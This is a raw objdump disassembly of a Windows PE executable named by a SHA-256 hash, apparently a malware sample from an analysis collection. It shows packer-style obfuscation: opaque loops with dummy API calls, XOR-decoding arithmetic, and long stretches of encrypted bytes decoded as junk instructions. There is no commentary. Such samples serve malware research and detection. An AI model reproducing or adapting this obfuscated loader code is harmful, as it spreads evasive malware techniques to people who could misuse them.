
e33912958495ad106252c7411fa514cfcd5835409a4c1285f5e8926fde2bcbfc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43365b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4336f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4336a7
  401023:	or     DWORD PTR ds:0x433653,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433643,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [ecx+0x71],ecx
  401049:	repz and eax,0x7c7c7c7c
  40104f:	addr16 jle 0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    ecx,DWORD PTR ds:0x330f023c
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x1aa7:0x886ca6ce
  4010ff:	xor    DWORD PTR ds:[eax+0xca269ef],ebp
  401106:	inc    esi
  401107:	add    eax,0xf9f3fc31
  40110c:	aas    
  40110d:	sub    eax,0xada05dfa
  401112:	sbb    ch,BYTE PTR [edx-0x7e8381d2]
  401118:	(bad)  [esi+0x7]
  40111b:	cmp    al,0x9c
  40111d:	dec    ebp
  40111e:	add    BYTE PTR [esi+0xe2e05fd],0x7e
  401125:	repz fnstenv [ebx-0x1f]
  401129:	mov    WORD PTR [edi+0x5d81cc73],ss
  40112f:	xor    dh,BYTE PTR [edi-0x33]
  401132:	jne    0x401125
  401134:	aaa    
  401135:	inc    ecx
  401136:	sbb    DWORD PTR [edi-0x2b6fb1c7],edi
  40113c:	sbb    BYTE PTR [esi-0x66],al
  40113f:	(bad)  
  401140:	ja     0x401176
  401142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401143:	lods   al,BYTE PTR ds:[esi]
  401144:	clc    
  401145:	lahf   
  401146:	aas    
  401147:	aad    0x5b
  401149:	std    
  40114a:	in     al,0xe1
  40114c:	mov    bl,0x8c
  40114e:	(bad)  
  401150:	xchg   edx,eax
  401151:	mov    eax,ds:0x3e5b8b73
  401156:	call   0xa66c55ec
  40115b:	adc    DWORD PTR [ecx+0x126ae420],ecx
  401161:	lea    esp,[edi+0x28]
  401164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401165:	xchg   esi,eax
  401166:	mov    DWORD PTR [ebp+ebp*8+0x1],eax
  40116a:	pop    edi
  40116b:	sbb    eax,0x36282467
  401170:	stos   BYTE PTR es:[edi],al
  401171:	lea    ebp,[edi]
  401173:	or     eax,0x30f403c3
  401178:	jno    0x401134
  40117a:	cmp    al,0x92
  40117c:	sub    al,0xd8
  40117e:	scas   eax,DWORD PTR es:[edi]
  40117f:	inc    edi
  401180:	aas    
  401181:	push   cs
  401182:	sub    BYTE PTR [ebx-0x28],bl
  401185:	leave  
  401186:	and    eax,0x586d63bf
  40118b:	mov    ecx,0xec44278a
  401190:	in     eax,dx
  401191:	or     bh,dl
  401193:	das    
  401194:	push   0x40
  401196:	sti    
  401197:	repz mov ebx,0x376c116c
  40119d:	xor    al,0x30
  40119f:	dec    esp
  4011a0:	enter  0xa06f,0x40
  4011a4:	out    0x51,eax
  4011a6:	dec    ebp
  4011a7:	je     0x40114d
  4011a9:	sub    DWORD PTR [esi],esi
  4011ab:	or     ah,BYTE PTR [edx-0x272e02c2]
  4011b1:	cmp    BYTE PTR ds:0xe306a62d,ah
  4011b7:	mov    ch,0x33
  4011b9:	sub    bh,dh
  4011bb:	or     ecx,DWORD PTR [eax+ebp*2]
  4011be:	scas   eax,DWORD PTR es:[edi]
  4011bf:	sbb    ecx,ecx
  4011c1:	into   
  4011c2:	dec    edi
  4011c3:	retf   0xaf62
  4011c6:	(bad)  
  4011c7:	jp     0x4011a0
  4011c9:	xor    ebx,DWORD PTR [ecx-0x31ff09ad]
  4011cf:	xchg   BYTE PTR [ebp+0x2a],dh
  4011d2:	push   ss
  4011d3:	inc    ebp
  4011d4:	sbb    DWORD PTR [esi+0x11],esp
  4011d7:	and    al,0x73
  4011d9:	mov    esp,0x91503c94
  4011de:	xchg   esp,eax
  4011df:	cwde   
  4011e0:	call   0xf78b:0x1abc65b0
  4011e7:	arpl   WORD PTR [ebx+0x3c],di
  4011ea:	xor    eax,0xb98d8ba1
  4011ef:	lahf   
  4011f0:	dec    ebp
  4011f1:	hlt    
  4011f2:	daa    
  4011f3:	call   0xf1fcdf4c
  4011f8:	out    dx,al
  4011f9:	cwde   
  4011fa:	dec    ecx
  4011fb:	push   esp
  4011fc:	pop    ebp
  4011fd:	sub    dh,bh
  4011ff:	xor    BYTE PTR [ecx],al
  401201:	jb     0x4011e8
  401203:	loopne 0x40127d
  401205:	icebp  
  401206:	fstp   QWORD PTR [ebx]
  401208:	adc    cl,BYTE PTR [edx+eax*2+0x46]
  40120c:	dec    esp
  40120d:	push   ss
  40120e:	or     BYTE PTR [ebp+0x1d05a935],0x8f
  401215:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  401217:	data16 mov WORD PTR [ebx+ecx*4+0x57976010],es
  40121f:	out    dx,al
  401220:	test   eax,0x16e66410
  401225:	dec    esi
  401226:	jae    0x4011cd
  401228:	lds    ebx,FWORD PTR [ebp+0x4ce462aa]
  40122e:	push   ebx
  40122f:	inc    eax
  401230:	mov    edi,0xe8dd6d0c
  401235:	(bad)  
  401236:	into   
  401237:	sbb    DWORD PTR [edx-0x5ceb1b68],0x66b1a600
  401241:	pop    esp
  401242:	mov    ebx,0x6f351bac
  401247:	(bad)  
  401248:	shl    DWORD PTR [ebp+0x35],1
  40124b:	mov    edi,fs
  40124d:	hlt    
  40124e:	jns    0x40127b
  401250:	sbb    edi,ecx
  401252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401253:	xlat   BYTE PTR ds:[ebx]
  401254:	sbb    eax,0x387d4c54
  401259:	jmp    0x2407:0x13765e62
  401260:	mov    DWORD PTR [eax+0x76a5d5d1],0x256b6fd5
  40126a:	stos   DWORD PTR es:[edi],eax
  40126b:	jmp    0x821c:0x6de61cb5
  401272:	cdq    
  401273:	add    bh,BYTE PTR [ecx+0x2a]
  401276:	in     al,dx
  401277:	daa    
  401278:	inc    ebp
  401279:	cli    
  40127a:	icebp  
  40127b:	(bad)  
  40127c:	xor    eax,0x50d54e72
  401281:	out    dx,eax
  401282:	loopne 0x4012c5
  401284:	fnsave [ecx]
  401286:	adc    eax,0x7148035
  40128b:	sbb    BYTE PTR [ecx-0x248bc7b8],al
  401291:	xor    eax,0x9482f33e
  401296:	jno    0x401259
  401298:	popa   
  401299:	mov    eax,ds:0x3103d919
  40129e:	jae    0x401234
  4012a0:	pop    edi
  4012a1:	imul   edi,DWORD PTR [eax-0x7fbee216],0xb2900796
  4012ab:	and    BYTE PTR [ecx+esi*1-0x8d4bb5e],al
  4012b2:	cwde   
  4012b3:	imul   edx,edi,0x42
  4012b6:	sbb    DWORD PTR [edx],esp
  4012b8:	lods   eax,DWORD PTR ds:[esi]
  4012b9:	in     eax,dx
  4012ba:	ret    
  4012bb:	iret   
  4012bc:	inc    edx
  4012bd:	jp     0x401303
  4012bf:	inc    esi
  4012c0:	lds    ebp,FWORD PTR [ecx+ecx*1+0x3d1579d6]
  4012c7:	fidiv  DWORD PTR [edi+0x18]
  4012ca:	js     0x40127b
  4012cc:	inc    edx
  4012cd:	call   0x6abe:0x12ab77cf
  4012d4:	retf   
  4012d5:	sbb    cl,dl
  4012d7:	pop    ebp
  4012d8:	xchg   edx,eax
  4012d9:	aam    0xe6
  4012db:	nop
  4012dc:	push   ebp
  4012dd:	cld    
  4012de:	sar    BYTE PTR [eax],1
  4012e0:	popa   
  4012e1:	fistp  QWORD PTR ds:0xb8964f00
  4012e7:	push   0xb4008147
  4012ec:	jns    0x4012f5
  4012ee:	fcomi  st,st(0)
  4012f0:	mov    edi,0x926d6c41
  4012f5:	iret   
  4012f6:	bound  edi,QWORD PTR [edi-0x39]
  4012f9:	sub    eax,DWORD PTR [esi]
  4012fb:	mov    edx,0xef0240ef
  401300:	(bad)  
  401302:	adc    al,0xf0
  401304:	xor    ebx,esp
  401306:	loop   0x401345
  401308:	sub    esp,DWORD PTR [ebx]
  40130a:	adc    eax,0xb19c5686
  40130f:	xor    eax,0xa0aed426
  401314:	enter  0x1b43,0x65
  401318:	xchg   esi,eax
  401319:	jp     0x401307
  40131b:	stos   BYTE PTR es:[edi],al
  40131c:	bound  ebx,QWORD PTR [ecx]
  40131e:	iret   
  40131f:	call   0x500abac1
  401324:	inc    edi
  401325:	adc    DWORD PTR [edi-0x57],edi
  401328:	lahf   
  401329:	ss dec esi
  40132b:	xchg   edi,eax
  40132c:	jg     0x4012c8
  40132e:	sahf   
  40132f:	inc    eax
  401330:	mov    DWORD PTR [eax-0x59],eax
  401333:	jns    0x4012c8
  401335:	fdivrp st(1),st
  401337:	in     eax,dx
  401338:	sub    al,BYTE PTR [ebx]
  40133a:	mov    dh,0xdb
  40133c:	mov    eax,DWORD PTR [ebp+0x8]
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4336a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43369b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43371f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43371f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43371f,ebx
  401379:	cmp    DWORD PTR ds:0x43371f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43371f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433663,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43369f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433697,0x19
  4013f7:	cmp    DWORD PTR ds:0x433697,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433697,0xb
  40140b:	jne    0x401421
  401411:	push   0x433653
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433697,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433697
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433697,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433697
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433697,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43364f,0x433643
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433653,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43371b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43371b
  40148e:	inc    eax
  40148f:	mov    ds:0x43371b,eax
  401494:	cmp    DWORD PTR ds:0x43371b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43371b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43371b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43371b,eax
  4014c4:	cmp    DWORD PTR ds:0x43371b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4336df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43365b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43364f,0x43369f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	adc    eax,0x67ec0fa7
  401517:	jle    0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x401565
  40151f:	xchg   edi,eax
  401520:	rol    DWORD PTR [ebp-0x4951d6b7],cl
  401526:	mov    DWORD PTR [edi],edi
  401528:	rcr    dh,cl
  40152a:	inc    edx
  40152b:	jno    0x4014cf
  40152d:	pop    edx
  40152e:	sbb    al,0x70
  401530:	rcr    BYTE PTR [edx+0x764fb0af],1
  401536:	inc    eax
  401537:	mov    esp,0xc60160cf
  40153c:	and    cl,bl
  40153e:	xchg   BYTE PTR [ebp+eax*1+0x76],al
  401542:	inc    eax
  401543:	push   es
  401544:	ja     0x40158a
  401546:	clc    
  401547:	scas   al,BYTE PTR es:[edi]
  401548:	mov    ebx,0x14429283
  40154d:	bound  eax,QWORD PTR [esi+edx*4+0x2210bc66]
  401554:	xor    DWORD PTR fs:[ebx],0x5d629652
  40155b:	and    dl,BYTE PTR [edx+edx*4]
  40155e:	mov    ah,0xe5
  401560:	leave  
  401561:	cmp    DWORD PTR [edi],0xffffff95
  401564:	(bad)  
  401565:	call   0x4c930379
  40156a:	sbb    ebp,edi
  40156c:	push   edi
  40156d:	pslld  mm6,QWORD PTR [edx]
  401570:	cmc    
  401571:	out    0xde,al
  401573:	inc    eax
  401574:	mov    al,0x84
  401576:	add    DWORD PTR [eax+0x6b],esp
  401579:	arpl   bx,bx
  40157b:	les    eax,FWORD PTR [edx]
  40157d:	adc    cl,BYTE PTR [esi+0x54ce43a9]
  401583:	lea    ebx,[ebx-0x15]
  401586:	fdivrp st(1),st
  401588:	imul   eax,DWORD PTR [esp+eax*2-0x48d39159],0x900596a4
  401593:	cmp    ebx,DWORD PTR [edi+0x7f173735]
  401599:	stc    
  40159a:	cmc    
  40159b:	outs   dx,BYTE PTR ds:[esi]
  40159c:	cwde   
  40159d:	sub    bl,BYTE PTR [ebx-0x14]
  4015a0:	rol    dl,0x50
  4015a3:	out    0x2a,eax
  4015a5:	xchg   esp,eax
  4015a6:	aas    
  4015a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015a8:	pop    ecx
  4015a9:	retf   
  4015aa:	xchg   edi,ebp
  4015ac:	in     al,dx
  4015ad:	pop    esp
  4015ae:	mov    ds:0x76908ee,al
  4015b3:	mov    cl,0x6c
  4015b5:	repz loop 0x401540
  4015b8:	leave  
  4015b9:	mov    eax,ds:0x8163bb0c
  4015be:	push   ecx
  4015bf:	mov    ds:0x88133997,al
  4015c4:	add    ebx,edi
  4015c6:	and    al,0x2
  4015c8:	ficom  DWORD PTR [esi]
  4015ca:	lea    esp,[eax+0x54]
  4015cd:	jb     0x40161e
  4015cf:	clc    
  4015d0:	es cwde 
  4015d2:	xchg   edi,eax
  4015d3:	mov    BYTE PTR [edx],0xe4
  4015d6:	sbb    DWORD PTR [edx],edi
  4015d8:	pop    esi
  4015d9:	xchg   esp,eax
  4015da:	daa    
  4015db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015dc:	or     eax,0x9738e92d
  4015e1:	into   
  4015e2:	icebp  
  4015e3:	adc    esi,DWORD PTR [ecx-0x36]
  4015e6:	sbb    BYTE PTR [edi+0x72],ch
  4015e9:	and    al,0x37
  4015eb:	je     0x40161b
  4015ed:	in     eax,dx
  4015ee:	mov    bh,BYTE PTR gs:[ebp+edx*8+0x7e]
  4015f3:	mov    al,0x22
  4015f5:	jmp    0xe6d1:0xd827f176
  4015fc:	outs   dx,BYTE PTR ds:[esi]
  4015fd:	push   edx
  4015fe:	jle    0x4015b0
  401600:	mov    ah,0xb5
  401602:	loope  0x401622
  401604:	and    edi,DWORD PTR [ecx]
  401606:	or     BYTE PTR [ebx+ebx*4+0x77],cl
  40160a:	inc    ebx
  40160b:	fxch   st(2)
  40160d:	aas    
  40160e:	dec    ebx
  40160f:	rsm    
  401611:	sbb    DWORD PTR [edi-0x60cd737f],esp
  401617:	test   eax,0x459ad869
  40161c:	call   0xe008:0x3c92d5a9
  401623:	mov    ds:0xec2f05c6,al
  401628:	adc    eax,DWORD PTR [ecx]
  40162a:	mov    esp,0xbb59f6f4
  40162f:	or     BYTE PTR [ebx+0x77],bl
  401632:	xchg   ebp,eax
  401633:	cmp    DWORD PTR [ecx-0x23],ebp
  401636:	push   esp
  401637:	sar    DWORD PTR [edx+0x6fa1a381],cl
  40163d:	inc    edx
  40163e:	call   0x4c36fb55
  401643:	sub    ah,0x35
  401646:	mov    ds:0xbbc1fbd7,al
  40164b:	push   ss
  40164c:	push   edx
  40164d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40164e:	push   0xd709c308
  401653:	or     dl,BYTE PTR [esi]
  401655:	pop    edi
  401656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401657:	and    BYTE PTR ss:[edx+0x2632e9a5],dl
  40165e:	push   0x8c843a10
  401663:	cmc    
  401664:	nop
  401665:	sti    
  401666:	js     0x40165b
  401668:	adc    DWORD PTR [edx+0x73818e30],0x67c12250
  401672:	ret    
  401673:	jp     0x4016a7
  401675:	jg     0x4016e3
  401677:	rol    DWORD PTR [esi],1
  401679:	push   ecx
  40167a:	int3   
  40167b:	or     DWORD PTR [ebp+0x35],esp
  40167e:	mov    eax,0x78c84aa3
  401683:	dec    esp
  401684:	inc    DWORD PTR [ecx-0x7894be37]
  40168a:	and    BYTE PTR [ecx+0x7712d6e9],bh
  401690:	push   0xffffffc7
  401692:	xchg   BYTE PTR [edx+edi*2-0x4f8e1c32],bl
  401699:	lea    edi,[edx-0x6944f02]
  40169f:	add    edx,0x5d
  4016a2:	inc    esp
  4016a3:	enter  0x5746,0x81
  4016a7:	adc    al,0xfe
  4016a9:	int3   
  4016aa:	int    0x36
  4016ac:	lea    edi,[ebp-0x40d0eb9a]
  4016b2:	outs   dx,DWORD PTR ds:[esi]
  4016b3:	or     ecx,DWORD PTR [edi-0x4f3975e5]
  4016b9:	sub    ebp,edx
  4016bb:	hlt    
  4016bc:	int3   
  4016bd:	addr16 pop ss
  4016bf:	cmp    eax,0xbc3984fd
  4016c4:	mov    dl,0x97
  4016c6:	mov    eax,ds:0xfe459147
  4016cb:	adc    DWORD PTR [ecx+edx*2],esi
  4016ce:	sub    DWORD PTR [ebx+0x790276c],ebx
  4016d4:	cmp    BYTE PTR [ecx],0xfe
  4016d7:	idiv   cl
  4016d9:	mov    edi,0x24f10d0c
  4016de:	mov    ebp,0x6ace10d6
  4016e3:	sub    al,0xda
  4016e5:	sub    eax,DWORD PTR [eax-0x3d]
  4016e8:	or     al,0x3a
  4016ea:	sbb    bl,BYTE PTR [edi+0x6d51b155]
  4016f0:	or     eax,0x2a12dd6b
  4016f5:	nop
  4016f6:	int    0x3f
  4016f8:	sub    esp,DWORD PTR [ebp+ebp*2+0x2d6d0ced]
  4016ff:	out    dx,al
  401700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401701:	cmp    dh,0xc7
  401704:	sub    bl,BYTE PTR [edi]
  401706:	adc    ebx,DWORD PTR [edi+0x4f]
  401709:	push   DWORD PTR [edx+0x74242756]
  40170f:	aaa    
  401710:	xchg   ebx,eax
  401711:	xor    DWORD PTR [ecx],eax
  401713:	das    
  401714:	cmc    
  401715:	mov    eax,ds:0xf320c5fe
  40171a:	jae    0x4016d9
  40171c:	lds    edx,FWORD PTR [ecx-0x76d7b6d2]
  401722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401723:	es sbb ebp,edi
  401726:	mov    edx,0x6b8fe20a
  40172b:	daa    
  40172c:	sub    ecx,DWORD PTR [ecx+0xc]
  40172f:	push   edx
  401730:	inc    ecx
  401731:	(bad)  
  401732:	cwde   
  401733:	rol    BYTE PTR [edx+0x221433d1],0x32
  40173a:	sub    eax,ebp
  40173c:	adc    dl,bh
  40173e:	push   0x6fb088e
  401743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401744:	sub    ebx,esi
  401746:	(bad)  
  401747:	xsha1  (bad)
  401748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401749:	dec    eax
  40174a:	pop    esi
  40174b:	push   0xdc4d2787
  401750:	mov    BYTE PTR [ebx+0x7a90d0c5],ah
  401756:	adc    eax,0xae5af457
  40175b:	ins    BYTE PTR es:[edi],dx
  40175c:	jmp    0x40177a
  40175e:	sti    
  40175f:	test   DWORD PTR [eax+0x77],0x8a5f7b19
  401766:	pop    ebx
  401767:	fdivr  QWORD PTR [ecx-0x1a465c59]
  40176d:	imul   edx,DWORD PTR [ebx-0x715fd286],0x46
  401774:	imul   ebp,eax,0xffffff95
  401777:	fldenv [ecx-0x3c]
  40177a:	out    0x1f,eax
  40177c:	lds    esp,FWORD PTR [ebp+ebp*4-0x40]
  401780:	add    bh,cl
  401782:	es mov ebp,0x49694dcd
  401788:	cmp    esi,DWORD PTR [edi+0x3]
  40178b:	outs   dx,DWORD PTR ds:[esi]
  40178c:	lock ds inc edx
  40178f:	xor    eax,0x62a8b4a3
  401794:	retf   
  401795:	fisub  DWORD PTR [edi]
  401797:	jns    0x40178b
  401799:	or     BYTE PTR [ebp-0x43],ch
  40179c:	push   ecx
  40179d:	ja     0x40172a
  40179f:	sbb    DWORD PTR [eax+ecx*4+0x7a],0xb8cb80df
  4017a7:	ds pushf 
  4017a9:	add    eax,0xa3ea7b1
  4017ae:	and    ah,BYTE PTR [ecx+0x268907ed]
  4017b4:	mov    edi,0x48083ec5
  4017b9:	comiss xmm2,DWORD PTR [ecx]
  4017bc:	lea    esi,[eax+eiz*2+0x66749d75]
  4017c3:	xor    DWORD PTR [ecx+0x2ab93245],ebx
  4017c9:	dec    edx
  4017ca:	addr16 xor al,0x3c
  4017cd:	loope  0x40182c
  4017cf:	leave  
  4017d0:	mov    ds:0xcf218774,al
  4017d5:	cmp    al,0x27
  4017d7:	gs ins DWORD PTR es:[edi],dx
  4017d9:	(bad)  
  4017da:	cli    
  4017db:	lods   al,BYTE PTR ds:[esi]
  4017dc:	inc    edi
  4017dd:	test   al,0x1c
  4017df:	icebp  
  4017e0:	jge    0x40183c
  4017e2:	jle    0x401846
  4017e4:	enter  0xd0fd,0x7e
  4017e8:	mov    esp,DWORD PTR [edi+0x51]
  4017eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ec:	push   esi
  4017ed:	adc    BYTE PTR [eax],ah
  4017ef:	xor    edx,esi
  4017f1:	sbb    BYTE PTR [edi+ecx*8],bl
  4017f4:	mov    ah,0x62
  4017f6:	mov    eax,ds:0x7e70f7f7
  4017fb:	add    eax,0xb44ab551
  401800:	cmp    eax,0xca53b588
  401805:	sbb    al,0x8b
  401807:	add    ecx,DWORD PTR [eax]
  401809:	mov    eax,ds:0x433757
  40180e:	add    DWORD PTR ds:0x43364b,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43369b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43369b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433663,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43372f,0x433717
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4336ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4336e7,0x18
  401872:	cmp    DWORD PTR ds:0x4336e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4336e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4336e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4336e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433717,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433717
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433717,edx
  4018db:	cmp    DWORD PTR ds:0x433717,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433717,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43376f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	(bad)  
  40192e:	mov    edi,0x7b4ea71c
  401933:	jl     0x4019b1
  401935:	addr16 jle 0x4019b4
  401938:	jl     0x40194b
  40193a:	jns    0x40193d
  40193c:	test   edi,eax
  40193e:	ins    BYTE PTR es:[edi],dx
  40193f:	sub    ecx,DWORD PTR [ebp-0x24d4eacc]
